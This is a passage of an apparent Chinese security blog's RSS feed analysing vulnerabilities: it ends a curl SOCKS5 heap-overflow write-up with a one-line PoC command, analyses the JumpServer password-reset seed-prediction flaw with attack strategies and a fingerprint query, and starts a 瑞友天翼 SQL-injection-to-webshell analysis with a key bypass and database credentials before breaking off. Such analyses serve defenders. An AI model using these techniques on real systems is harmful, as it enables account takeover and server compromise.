&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    data&lt;span style="color:#f92672">-&amp;gt;&lt;/span>state.buffer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(data&lt;span style="color:#f92672">-&amp;gt;&lt;/span>set.buffer_size &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>data&lt;span style="color:#f92672">-&amp;gt;&lt;/span>state.buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>      &lt;span style="color:#66d9ef">return&lt;/span> CURLE_OUT_OF_MEMORY;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>  &lt;span style="color:#66d9ef">return&lt;/span> CURLE_OK;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在我的环境中可以看到最终的内存大小为0x8ce+1&lt;/p>
&lt;pre tabindex="0">&lt;code>gef➤ p data.set.buffer_size
$12 = 0x8ce
gef➤
&lt;/code>&lt;/pre>&lt;p>所以如果构造大于这个大小的hostname，在memcpy时就可以触发堆溢出。&lt;/p>
&lt;p>&lt;strong>PoC&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl --location --limit-rate 2254B --socks5-hostname 192.168.32.1:10808 &lt;span style="color:#66d9ef">$(&lt;/span>python3 -c &lt;span style="color:#e6db74">&amp;#34;print(&amp;#39;A&amp;#39;*10000,end=&amp;#39;&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="小结">小结&lt;/h3>
&lt;p>在修复代码中，如果hostname超过255则会直接返回错误，而不再访问后面的状态机，直接阻断了调用链。虽然url的hostname没有长度规定，可以超过1024，但由于DNS解析最大只支持255字节的域名，所以在正常请求中不应该出现域名大于255的情况，从这个角度看此次修复方式也很合理。&lt;/p>
&lt;p>从利用角度看这个漏洞，攻击者需要可以控制curl或libcurl使用的socks5代理，还需要控制传递给curl和libcurl的url，而后才能触发漏洞，表面看攻击者可以控制溢出的范围和内容，很可能通过堆溢出造成代码执行。但curl会通过url parser去验证url有效性，如果url无效则会产生错误，因此只当url合法时才会触发漏洞，也就是攻击者构造的url只能是ASCII字符的子集，综合上面的条件，这个漏洞利用难度极大，造成代码执行的几率很小。&lt;/p>
&lt;p>考虑到大部分软件即使能控制url，但也不能控制让libcurl使用socks5代理，所以可以择期修复这个漏洞。&lt;/p>
&lt;p>&lt;strong>题外话&lt;/strong>
这个漏洞还让curl的作者难过了一下：&lt;em>&lt;strong>It burns in my soul&lt;/strong>&lt;/em>. 作者说，如果使用内存安全的语言重写curl的话，那这些漏洞就不会存在，当然在可预见的未来curl还是会用c开发，但目前可行的办法是逐渐使用内存安全的依赖项替代。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://curl.se/docs/CVE-2023-38545.html" target="_blank">https://curl.se/docs/CVE-2023-38545.html&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://daniel.haxx.se/blog/2023/10/11/how-i-made-a-heap-overflow-in-curl/" target="_blank">https://daniel.haxx.se/blog/2023/10/11/how-i-made-a-heap-overflow-in-curl/&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://hackerone.com/reports/2187833" target="_blank">https://hackerone.com/reports/2187833&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://datatracker.ietf.org/doc/html/rfc1928" target="_blank">https://datatracker.ietf.org/doc/html/rfc1928&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-10-11T20:40:32+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-4863 Libwebp Rce 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/</link><pubDate>Sat, 07 Oct 2023 10:23:56 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/</guid><description>&lt;p>&lt;strong>Created at 2023-10-07T10:23:56+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/</link><pubDate>Fri, 29 Sep 2023 20:32:52 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>jumpserver中第三方库向用户公开了随机库所用的seed，并且没有限制重置密码接口的次数，导致攻击者可以获取到随机库的随机种子并尝试预测重置密码的验证码，进而重置任意用户密码。
利用该漏洞需要已知用户名和对应的邮箱。&lt;/p>
&lt;h4 id="指纹">指纹&lt;/h4>
&lt;p>hunter&lt;/p>
&lt;pre tabindex="0">&lt;code>web.title=&amp;#34;jumpserver&amp;#34;
&lt;/code>&lt;/pre>&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;ul>
&lt;li>CVE-2023-42820
v2.24 - v3.6.4&lt;/li>
&lt;/ul>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>参考
&lt;a href="https://github.com/jumpserver/Dockerfile" target="_blank">https://github.com/jumpserver/Dockerfile&lt;/a>，将版本改为3.6.4，使用docker启动即可。&lt;/p>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>&lt;strong>补丁分析&lt;/strong>
漏洞在commit
&lt;a href="https://github.com/jumpserver/jumpserver/commit/0eba6d2175ab752399c5aee2dbaaf311bf0a398d" target="_blank">0eba6d2175ab752399c5aee2dbaaf311bf0a398d&lt;/a>修复，查看补丁，可知在&lt;code>apps/common/utils/random.py#random_string&lt;/code>处增加了 random.seed()调用，同时对 &lt;code>apps/users/models/user.py#generate_reset_token&lt;/code>生成token改为增加了 &lt;code>random.seed&lt;/code>调用的random_string函数
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-42820-jumpserver-pwd-reset-vuln.zh-cn.assets/1.png" />&lt;/p>
&lt;p>到这里只能隐约猜到是一个密码学有关的漏洞，应该可以通过爆破利用。&lt;/p>
&lt;p>&lt;strong>技术分析&lt;/strong>
在前两天有师傅写出了分析，才恍然大悟。&lt;/p>
&lt;p>根据
&lt;a href="https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw" target="_blank">jumpserver最新re-auth复现（伪随机经典案例）&lt;/a>可知在本例的jumpserver中在如下地方生成重置密码时的验证码，其中使用了本次修复的函数 random_string生成6位，范围为000000-999999的数字验证码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>opt&lt;span style="color:#f92672">/&lt;/span>jumpserver&lt;span style="color:#f92672">/&lt;/span>apps&lt;span style="color:#f92672">/&lt;/span>authentication&lt;span style="color:#f92672">/&lt;/span>api&lt;span style="color:#f92672">/&lt;/span>password&lt;span style="color:#f92672">.&lt;/span>py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">create&lt;/span>(self, request, &lt;span style="color:#f92672">*&lt;/span>args, &lt;span style="color:#f92672">**&lt;/span>kwargs):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> token &lt;span style="color:#f92672">=&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>GET&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;token&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> userinfo &lt;span style="color:#f92672">=&lt;/span> cache&lt;span style="color:#f92672">.&lt;/span>get(token)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> userinfo:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> HttpResponseRedirect(reverse(&lt;span style="color:#e6db74">&amp;#39;authentication:forgot-previewing&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> serializer &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>get_serializer(data&lt;span style="color:#f92672">=&lt;/span>request&lt;span style="color:#f92672">.&lt;/span>data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> serializer&lt;span style="color:#f92672">.&lt;/span>is_valid(raise_exception&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> username &lt;span style="color:#f92672">=&lt;/span> userinfo&lt;span style="color:#f92672">.&lt;/span>get(&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> form_type &lt;span style="color:#f92672">=&lt;/span> serializer&lt;span style="color:#f92672">.&lt;/span>validated_data[&lt;span style="color:#e6db74">&amp;#39;form_type&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> code &lt;span style="color:#f92672">=&lt;/span> random_string(&lt;span style="color:#ae81ff">6&lt;/span>, lower&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>, upper&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/tmp/code&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f&lt;span style="color:#f92672">.&lt;/span>write(code&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> other_args &lt;span style="color:#f92672">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target &lt;span style="color:#f92672">=&lt;/span> serializer&lt;span style="color:#f92672">.&lt;/span>validated_data[form_type]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> form_type &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;sms&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> query_key &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;phone&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target &lt;span style="color:#f92672">=&lt;/span> target&lt;span style="color:#f92672">.&lt;/span>lstrip(&lt;span style="color:#e6db74">&amp;#39;+&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> query_key &lt;span style="color:#f92672">=&lt;/span> form_type
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user, err &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>is_valid_user(username&lt;span style="color:#f92672">=&lt;/span>username, &lt;span style="color:#f92672">**&lt;/span>{query_key: target})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> user:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> Response({&lt;span style="color:#e6db74">&amp;#39;error&amp;#39;&lt;/span>: err}, status&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">400&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> subject &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (get_login_title(), _(&lt;span style="color:#e6db74">&amp;#39;Forgot password&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> context &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>: user, &lt;span style="color:#e6db74">&amp;#39;title&amp;#39;&lt;/span>: subject, &lt;span style="color:#e6db74">&amp;#39;code&amp;#39;&lt;/span>: code,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> message &lt;span style="color:#f92672">=&lt;/span> render_to_string(&lt;span style="color:#e6db74">&amp;#39;authentication/_msg_reset_password_code.html&amp;#39;&lt;/span>, context)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> other_args[&lt;span style="color:#e6db74">&amp;#39;subject&amp;#39;&lt;/span>], other_args[&lt;span style="color:#e6db74">&amp;#39;message&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> subject, message
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SendAndVerifyCodeUtil(target, code, backend&lt;span style="color:#f92672">=&lt;/span>form_type, &lt;span style="color:#f92672">**&lt;/span>other_args)&lt;span style="color:#f92672">.&lt;/span>gen_and_send_async()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> Response({&lt;span style="color:#e6db74">&amp;#39;data&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;ok&amp;#39;&lt;/span>}, status&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在大学学习c语言的rand函数时，如果不对其显式使用srand函数播种的话，则每次运行程序随机出来的结果是一样的，因为rand使用的种子在计算机启动时就不会再变化了，所以我们要使用srand函数产生种子并进行播种，来使得rand函数的结果不一样。
实际上计算机中的随机数不是真正的随机数，而是伪随机数，计算机根据传入的种子经过某些运算得出结果。
对于一个进程，随机的种子确定则随机数也确定。
这个规律在python中也一样，对于同样的seed及同样的随机次数，一定会生成同样的数字。&lt;/p>
&lt;pre tabindex="0">&lt;code>Python 3.11.4 (tags/v3.11.4:d2340ef, Jun 7 2023, 05:45:37) [MSC v.1934 64 bit (AMD64)] on win32
Type &amp;#34;help&amp;#34;, &amp;#34;copyright&amp;#34;, &amp;#34;credits&amp;#34; or &amp;#34;license&amp;#34; for more information.
&amp;gt;&amp;gt;&amp;gt; import random
&amp;gt;&amp;gt;&amp;gt; random.seed(1010)
&amp;gt;&amp;gt;&amp;gt; random.random()
0.6710054770408643
➜ chestnut python3
Python 3.11.4 (main, Jun 7 2023, 10:13:09) [GCC 12.2.0] on linux
Type &amp;#34;help&amp;#34;, &amp;#34;copyright&amp;#34;, &amp;#34;credits&amp;#34; or &amp;#34;license&amp;#34; for more information.
&amp;gt;&amp;gt;&amp;gt; import random
&amp;gt;&amp;gt;&amp;gt; random.seed(1010)
&amp;gt;&amp;gt;&amp;gt; random.random()
0.6710054770408643
&amp;gt;&amp;gt;&amp;gt;
&lt;/code>&lt;/pre>&lt;p>虽然我们现在知道了这个漏洞应该源于伪随机数，但我们如果没办法获取到随机时所设置的种子，也没办法预测随即结果。&lt;/p>
&lt;p>下面就是这个漏洞的精华所在，根据文章所述。
django使用了第三方库&lt;code>djiango-simple-captcha&lt;/code>库来生成验证码，在这个库生成的时候会有如下逻辑：
在&lt;code>usr/local/lib/python3.11/site-packages/captcha/views.py$captcha_image&lt;/code>中，通过传入的key设置&lt;code>random.seed()&lt;/code>，而传入的key则是浏览器向后端请求图片的路径，下图的key为 &lt;code>c83d66ac7dca7e2189ad17a9a3e532f2e87d5c07&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">captcha_image&lt;/span>(request, key, scale&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#66d9ef">if&lt;/span> scale &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#f92672">not&lt;/span> settings&lt;span style="color:#f92672">.&lt;/span>CAPTCHA_2X_IMAGE:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">raise&lt;/span> Http404
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        store &lt;span style="color:#f92672">=&lt;/span> CaptchaStore&lt;span style="color:#f92672">.&lt;/span>objects&lt;span style="color:#f92672">.&lt;/span>get(hashkey&lt;span style="color:#f92672">=&lt;/span>key)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#66d9ef">except&lt;/span> CaptchaStore&lt;span style="color:#f92672">.&lt;/span>DoesNotExist:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#75715e"># HTTP 410 Gone status so that crawlers don&amp;#39;t index these expired urls.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">return&lt;/span> HttpResponse(status&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">410&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    random&lt;span style="color:#f92672">.&lt;/span>seed(key)  &lt;span style="color:#75715e"># Do not generate different images for the same key&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    text &lt;span style="color:#f92672">=&lt;/span> store&lt;span style="color:#f92672">.&lt;/span>challenge
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-42820-jumpserver-pwd-reset-vuln.zh-cn.assets/2.png" />&lt;/p>
&lt;p>也就是我们可以通过图片的url间接知道jumpserver随机时所使用的种子，也就是说，通过图片地址我们可以获取到种子，如果生成验证码时所在的进程和这个生成图片验证码的进程在同一个进程，那么我们就可以通过获取到的种子和使用jumpserver生成验证码的算法来预测jumpserver生成重置密码的验证码。
这样我们可以在很少的时间（次数）内预测到重置密码的验证码，进而重置密码。
但仅仅这么简单吗？在jumpserver中使用了 &lt;code>gunicorn&lt;/code>，它会使用master进程fork worker进程，处理用户请求，所以即使我们通过单次的图片请求获取到了random的种子，处理重置密码请求的进程可能不是被获取到种子的进程，这样预测出来的验证码和重置密码时生成的不会一样。&lt;/p>
&lt;pre tabindex="0">&lt;code>➜ chestnut docker top 808b | grep python
root 5704 5674 0 11:08 ? 00:00:02 python jms start web
root 5864 5704 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/celery -A ops flower -logging=info --url_prefix=/core/flower --auto_refresh=False --max_tasks=1000 --state_save_interval=600000
root 5865 5704 0 11:08 ? 00:00:00 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss &amp;#34;%(r)s&amp;#34; %(s)s %(b)s --access-logfile -
root 5867 5865 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss &amp;#34;%(r)s&amp;#34; %(s)s %(b)s --access-logfile -
root 5868 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss &amp;#34;%(r)s&amp;#34; %(s)s %(b)s --access-logfile -
root 5873 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss &amp;#34;%(r)s&amp;#34; %(s)s %(b)s --access-logfile -
root 5874 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss &amp;#34;%(r)s&amp;#34; %(s)s %(b)s --access-logfile -
&lt;/code>&lt;/pre>&lt;p>在文章中提到可以有两种办法：&lt;/p>
&lt;ul>
&lt;li>并发同时发送多个请求，通过大量请求使得每个&lt;code>gunicorn&lt;/code>进程都会接收到图片验证码的请求，从而将所有进程的seed设置为同一个种子，这样后续重置密码时无论哪个进程接收到的请求，该进程的seed都是已知的。&lt;/li>
&lt;li>通过某种办法将&lt;code>gunicorn&lt;/code>打挂，并监测服务状态，当服务响应码从502变为200时，说明进程恢复正常，这时通过少量请求即可将所有目标进程的seed设置为我们已知的值。
并发发送大量请求让我想起了k8s环境中，pod切换IP的场景，&lt;/li>
&lt;/ul>
&lt;p>时间比较紧（太笨了），没看出来哪里可以造成crash，在使用第一种办法的时候，发现会有些许问题&lt;/p>
&lt;ul>
&lt;li>在发送几千个请求之后，通过图片验证码请求触发重置密码时，后端会返回这个验证码不正确&lt;/li>
&lt;li>在发送请求之后，经过测试使用seed生成和jumpserver相同的code需要经过几万次&lt;/li>
&lt;/ul>
&lt;p>所以在这里讨巧，手动重启core container（模拟crash了gunicorn的场景），而后通过请求验证码图片设置seed，经过测试成功的次数范围为200+，即成功生成和jumpserver一样的重置密码验证码需要random两百多次。&lt;/p>
&lt;h3 id="小结">小结&lt;/h3>
&lt;p>回过头看文章所说的 &lt;code>随机深度&lt;/code>，按照我的理解就是在生成code时，所在进程已经random了几次，随机次数越多，预测时所要的次数也就越多，因为相同的seed经过相同的次数生成的随机数是一样的，在生成验证码和random_string函数中均有多次使用random类函数生成随机数，所以才需要循环计算进行碰撞。
在漏洞利用过程中，除了前面说的覆盖seed的问题，jumpserver还会验证请求url里面的token以及POST的body里面需要携带csrf token，这些都可以通过url解析以及xpath从请求响应中获取到。在一个就是生成重置密码验证码后，这个验证码有60秒有效期，过了60秒之后再去碰撞后端会返回验证码已过期，需要重新生成。
在有个问题就是图片验证码涉及到数学运算，粗略看来验证码应该可以通过ocr库进行识别并计算，实现自动化获取图片地址、设置seed、计算验证码等，这个只能等节后仔细研究了。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp" target="_blank">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw" target="_blank">https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>创建于2023-09-28&lt;/p>
&lt;p>&lt;strong>Created at 2023-09-29T20:32:52+08:00&lt;/strong>&lt;/p></description></item><item><title>瑞友天翼 Rce分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/</link><pubDate>Wed, 20 Sep 2023 10:04:31 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>瑞友天翼中存在SQL注入漏洞，攻击者可以利用SQL注入写入webshell，控制目标服务器。&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>略&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>略&lt;/p>
&lt;h3 id="技术分析">技术分析&lt;/h3>
&lt;p>数据库基本信息&lt;/p>
&lt;pre tabindex="0">&lt;code>127.0.0.1:5873
db: CASSystemDS
pwd: F1B5214C
user: admin
&lt;/code>&lt;/pre>&lt;p>在ConsoleExternalApi.XGI中根据代码逻辑可得，请求中需携带initparams、key、sign等参数&lt;/p>
&lt;pre tabindex="0">&lt;code>
$initparams = $_REQUEST[&amp;#39;initParams&amp;#39;];
$key = $_REQUEST[&amp;#39;key&amp;#39;];
$sign = $_REQUEST[&amp;#39;sign&amp;#39;];
&lt;/code>&lt;/pre>&lt;p>参数校验逻辑如下，此时直接使用key=inner绕过判断，则$keyVal值为Realor，下面拼接了$initparams和$keyVal并计算其md5值是否和sign变量相同。&lt;/p>
&lt;pre tabindex="0">&lt;code>if ($key == &amp;#34;wusuokey&amp;#34;) {
$keyVal = $COMCASWEB-&amp;gt;getfarminfo($key);
} else if ($key == &amp;#34;inner&amp;#34;) {
$keyVal = &amp;#34;Realor&amp;#34;;
}
if (!isset($keyVal) || empty($keyVal)) {
write_log(&amp;#34;{&amp;#39;参数非法&amp;#39;:&amp;#39;key值为空&amp;#39;}&amp;#34;);
exitErrorJson(&amp;#39;参数非法&amp;#39;);
}
$signCalculate = md5($initparams . $keyVal);
//testLog(&amp;#34;signCalculate=&amp;#34; . $signCalculate);
if ($signCalculate != $sign) {
write_log(&amp;#34;{&amp;#39;参数非法&amp;#39;:&amp;#39;参数加密方法错误&amp;#39;}&amp;#34;);
exitErrorJson(&amp;#39;参数非法&amp;#39;);
}
&lt;/code>&lt;/pre>&lt;p>之后使用两个下划线分割$initparams变量，存入数组并遍历数组&lt;/p>
&lt;pre tabindex="0">&lt;code>// 两个下划线分割，变成一个数组，之后遍历数组，用一个下划线分割并变成键值对存入$requestObj变量中。
$paramArr = explode(&amp;#34;__&amp;#34;, $initparams);
if (count($paramArr) == 0) {
write_log(&amp;#34;{&amp;#39;参数非法&amp;#39;:&amp;#39;参数中未包含__&amp;#39;}&amp;#34;);
exitErrorJson(&amp;#39;参数非法11&amp;#39;);
}
$requestObj = null;
//testLog($paramArr);
foreach ($paramArr as $key =&amp;gt; $value) {
$keyValue = explode(&amp;#34;_&amp;#34;, $value);
$requestObj[$keyValue[0]] = $keyValue[1];
}
&lt;/code>&lt;/pre>&lt;p>之后从键值对数组中取出键为command的值，进行判断
&lt;code>$cmd = $requestObj['command'];&lt;/code>
当$cmd为createUser时，从请求中取出POST body并尝试进行json decode，从中取出键为account的值拼接到sql语句中进行查询，此时可以使用单引号进行sql注入，借助&lt;code>union select into outfile&lt;/code>语句写入&lt;code>webshell&lt;/code>，达成代码执行。&lt;/p>
&lt;pre tabindex="0">&lt;code>if ($cmd == &amp;#34;createUser&amp;#34;) {
$POST_JSON = json_decode($HTTP_RAW_POST_DATA, true);
$fId = getDefaultVal($POST_JSON[&amp;#39;userGroupId&amp;#39;], getAdminGroupId());
$account = $POST_JSON[&amp;#39;account&amp;#39;];
if (!isset($account) || empty($account)) {
write_log(&amp;#34;{&amp;#39;createUser&amp;#39;:&amp;#39;用户账户不可为空&amp;#39;}&amp;#34;);
exitErrorJson(&amp;#39;用户账号不可为空&amp;#39;);
}
$account = utf8ToGbk($account);
$userPwd = $POST_JSON[&amp;#39;userPwd&amp;#39;];
if (!isset($userPwd) || empty($userPwd)) {
write_log(&amp;#34;{&amp;#39;createUser&amp;#39;:&amp;#39;用户密码不可为空&amp;#39;}&amp;#34;);
exitErrorJson(&amp;#39;用户密码不可为空&amp;#39;);
}
//账号是否已存在
